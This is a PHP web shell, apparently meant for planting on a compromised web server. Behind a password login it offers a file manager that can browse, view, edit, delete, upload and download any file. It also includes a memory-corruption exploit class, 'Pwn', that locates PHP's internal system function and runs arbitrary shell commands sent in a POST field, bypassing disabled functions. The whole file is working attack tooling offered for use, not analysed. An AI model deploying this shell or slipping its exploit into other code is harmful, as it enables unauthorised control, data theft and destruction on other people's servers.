<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);
// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik
$hashed_password = '$2y$10$1b05G7jPhNAe9KEJbpyspOTC1N0y28nY913UBKFfWnmbApEgI9QHy';

// Fungsi untuk menampilkan form login
function admin_login() {
    echo '<title>Login</title>';
    echo '<form method="post">';
    echo '<input type="password" name="password">';
    echo '<input type="submit" value="Login">';
    echo '</form>';
    exit;
}

if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
    // Memeriksa apakah password dikirim dan benar
    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
        // Logika setelah login berhasil
    } else {
        admin_login();
    }
}

$head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';

if(isset($_POST['c'])){
$xmd=$_POST['c'];
    new Pwn($xmd);
}

class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = ZEND_DEBUG_BUILD ? self::CHUNK_DATA_SIZE + 0x20 : self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;

    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($xmd) {
        echo '<pre>';
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);

        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        self::log("abc @ 0x%x", $abc_addr);

        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) {
            self::log("uaf failed");
            return;
        }

        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;

        $helper_handlers = $this->rel_read(0);
        self::log("helper handlers @ 0x%x", $helper_handlers);

        $closure_addr = $this->rel_read(0x20);
        self::log("real closure @ 0x%x", $closure_addr);

        $closure_ce = $this->read($closure_addr + 0x10);
        self::log("closure class_entry @ 0x%x", $closure_ce);
        
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        self::log("basic_functions @ 0x%x", $basic_funcs);

        $zif_system = $this->get_system($basic_funcs);
        self::log("zif_system @ 0x%x", $zif_system);

        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);

        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        self::log("fake closure @ 0x%x", $fake_closure_addr);

        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($xmd);

        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
        echo '</pre>';
    }

    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }

    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }

    private function rel_read($offset) {
        return self::str2ptr($this->abc, $offset);
    }

    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }

    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }

    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) {
                return $this->read($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry !== 0);
    }

    private function get_basic_funcs($addr) {
        while(true) {
            // In rare instances the standard module might lie after the addr we're starting
            // the search from. This will result in a SIGSGV when the search reaches an unmapped page.
            // In that case, changing the direction of the search should fix the crash.
            // $addr += 0x10;
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4),
                    [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) {
                    self::log("standard module @ 0x%x", $addr);
                    return $this->read($addr + 0x28);
                }
            }
        }
    }

    private function log($format, $val = "") {
        if(self::LOGGING) {
            printf("{$format}\n", $val);
        }
    }

    static function alloc($size) {
        return str_shuffle(str_repeat("A", $size));
    }

    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p + $j]);
        }
        return $address;
    }
}


function get_post($name){
    return (isset($_POST[$name]) ? $_POST[$name] : false);
}
function get_get($name){
    return (isset($_GET[$name]) ? $_GET[$name] : false);
}
function makeInput($type,$name,$val = "", $style = ""){
    if(in_array($type,['text','password','submit','file'])){
        return "<input type='$type' name='$name' value='$val' style='$style'/>";
	}
    return "<$type name='$name' style='$style'>$val</$type>";
}
function makeForm($method, $inputArray,$file = ""){
    $form = "<form method=$method enctype='$file'>"; 
    foreach($inputArray as $key=>$val){
        $form .= makeInput($key,(is_array($val) ? $val[0] : $val), (isset($val[1]) ? $val[1] : ""), (isset($val[2]) ? $val[2] : ""));
    }
    return $form."</form>";
}
function makeTable($thead,$tbody){
    $head = "";
    foreach($thead as $th){
        $head .= "<th>$th</th>";
    }
    $body = "";
    foreach($tbody as $tr){
        $body .= "<tr>";
        foreach($tr as $td){
            $body .= "<td>$td</td>";
        }
        $body .= "</tr>";
    }
    return "<table><thead>$head</thead><tbody>$body</tbody></table>";
}
function makeLink($link,$text,$target = ""){
	return"<a href='$link' target='$target'>$text</a> ";
}
function get_path(){
    $path = __dir__;
    if(get_get('path')){
        $path = get_get('path');
	}
    return $path;
}
function filesize_convert($bytes){
    $label = array( 'B', 'KB', 'MB', 'GB', 'TB', 'PB' );
    for( $i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++ );
    return( round( $bytes, 2 ) . " " . $label[$i] );
}
function fileTime($path){
    return date("M d Y H:i:s", filemtime($path));
}
function download_file($download){
	if(!is_file($download)){
		return false;
	}
	header('Content-Type: application/octet-stream');
	header('Content-Transfer-Encoding: Binary');
	header('Content-disposition: attachment; filename="'.basename($download).'"');
	return readfile($download);
}
function delete_file($delete){
	if(is_file($delete)){
		return unlink($delete);
	}
	if(is_dir($delete)){
		return rmdir($delete);
	}
	return false;
}
function edit_file($edit){
	if(is_file($edit)){
		return makeForm('POST',
			['textarea'=>['edit',htmlentities(file_get_contents($edit)),"width:100%;height:90%"],
			'submit'=>['save','Save']]);
	}
	return false;
}
function save_edit($path,$str){
	if(is_file($path)){
		file_put_contents($path,html_entity_decode($str));
		return true;
	}
	return false;
}
function view_file($path){
	if(is_file($path)){
		return htmlentities(file_get_contents($path));
	}
	return false;
}
function new_file($path,$name){
	if(!is_file($path.'/'.$name)){
		file_put_contents($path.'/'.$name,"");
		return true;
	}
	return false;
}
function new_dir($path,$name){
	if(!is_dir($path.'/'.$name)){
		mkdir($path.'/'.$name);
		return true;
	}
	return false;
}
function upload_file($path,$file){
	$name = basename($file['name']);
	if(!is_file($path.'/'.$name)){
		if(move_uploaded_file($file["tmp_name"], $path.'/'.$name)){
			return true;
		}
	}
	return false;
}
function get_back($path){
	if($path == "" || $path == "/"){
		return $path;
	}
	$path = explode("/",str_replace('\\','/',$path));
	array_pop($path);
	return implode("/",$path);
}
function get_dir(){
    $path = get_path();
    if(!is_dir($path)){
        return false;
    }
    $dir = scandir($path);
    $dirs = [];
    $files = [];
    $i = 0;
    foreach($dir as $d){
        if($d == '.' || $d == '..'){
            continue;
        }
        $p = $path.'/'.$d;
        $s = '--';
        $icon = "&#128193;";
        $t = fileTime($p);
        $l = makeLink("?path=$p",$d);
        $perms = substr(sprintf("%o", fileperms($p)),-4);
        $owner =  (function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($p))['name'] : fileowner($p));
        $controller = 
            (is_file($p) ? makeLink("?edit=$p","Edit","_blank") : '').
            makeLink("?delete=$p","Delete","_blank").
            (is_file($p) ? makeLink("?download=$p","Download","_blank") : '');
        if(is_dir($p)){
            $dirs[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
        } else {
            $s = filesize_convert(filesize($p));
            $icon = "&#128221;";
            $files[] = [$icon,$i,$l,$s,$t,$perms,$owner,$controller];
        }
        $i++;
    }
    $items = array_merge($dirs, $files);
    return makeTable(['#','id','Filename','Size','Modified','Perms','Owner',''],$items);
}

if(get_get("delete")){
	delete_file(get_get("delete")) ? die("Deleted: ".get_get("delete")) : die("File not found");
}
if(get_get("edit")){
	if(get_post('save')){
		save_edit(get_get('edit'),get_post('edit'));
		echo "Saved";
	}
	$edit = edit_file(get_get("edit"));
	$edit ? die($edit) : die("File not found");
}
if(get_get('download')){
	@readfile(download_file(get_get('download')));
	exit();
}
if(get_post('newfile')){
	new_file(get_path(),get_post('filename')) ? die('Create: '.get_post('filename')) : die('File exites');
}
if(get_post('newdir')){
	new_dir(get_path(),get_post('dirname')) ? die('Create: '.get_post('dirname')) : die('Dir exites');
}
if(get_post('upload')){
	upload_file(get_path(),$_FILES['file']) ? die('upload: '. $_FILES['file']['name']) : die('Upload Error');
}
echo $head.
	"<body>".
	makeForm('POST',['text'=>['filename','File Name'],'submit'=>['newfile','Create']]).
	makeForm('POST',['text'=>['dirname','Dir Name'],'submit'=>['newdir','Create']]).
	makeForm('POST',['file'=>'file','submit'=>['upload','Upload']],'multipart/form-data').
    '<form method="post">
    <input type="text" name="c" size="30">
    <input type="submit" value="Kill">
    </form>' .
	makeLink("?path=".get_back(get_path()),"[Back]").
	(is_dir(get_path()) ? get_dir() : '<pre>'.view_file(get_path()).'</pre>')
	."</body>";
